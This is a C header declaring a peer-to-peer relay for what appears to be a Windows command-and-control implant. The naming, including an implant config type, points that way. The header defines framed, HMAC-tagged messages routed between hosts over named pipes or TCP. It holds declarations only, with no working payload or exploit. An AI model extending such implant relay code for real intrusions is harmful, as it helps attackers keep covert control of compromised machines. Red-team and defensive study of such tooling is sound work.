#ifndef JAGER_P2P_RELAY_H
#define JAGER_P2P_RELAY_H

#include <windows.h>
#include <winsock2.h>
#include "config.h"

#ifdef __cplusplus
extern "C" {
#endif

#define P2P_ID_MAX       64
#define P2P_ROUTE_MAX    32
#define P2P_FRAME_MAGIC  0x31503250  /* "P2P1" little-endian */
#define P2P_HMAC_SIZE    8
#define P2P_HDR_SIZE     (4 + P2P_HMAC_SIZE + P2P_ID_MAX + P2P_ID_MAX + 4)

typedef enum {
    P2P_TRANSPORT_PIPE = 0,
    P2P_TRANSPORT_TCP  = 1
} P2P_TRANSPORT_TYPE;

typedef struct {
    char             dest_id[P2P_ID_MAX];
    HANDLE           hPipe;
    SOCKET           sock;
    P2P_TRANSPORT_TYPE type;
    BOOL             active;
} P2P_ROUTE;

void p2p_relay_init(const char *local_id);
void p2p_relay_set_config(PIMPLANT_CONFIG config);
void p2p_relay_set_upstream(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type);
BOOL p2p_route_add(const char *dest_id, HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type);
BOOL p2p_route_remove(const char *dest_id);
DWORD p2p_frame_pack(const char *dest_id, const char *src_id,
                     const BYTE *payload, DWORD payload_len,
                     BYTE *out, DWORD out_cap);
BOOL p2p_send_frame(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type,
                    const BYTE *frame, DWORD frame_len);
BOOL p2p_relay_process(HANDLE hPipe, SOCKET sock, P2P_TRANSPORT_TYPE type,
                       const BYTE *data, DWORD data_len);
BOOL p2p_relay_configure(const char *json, DWORD json_len);

#ifdef __cplusplus
}
#endif

#endif /* JAGER_P2P_RELAY_H */
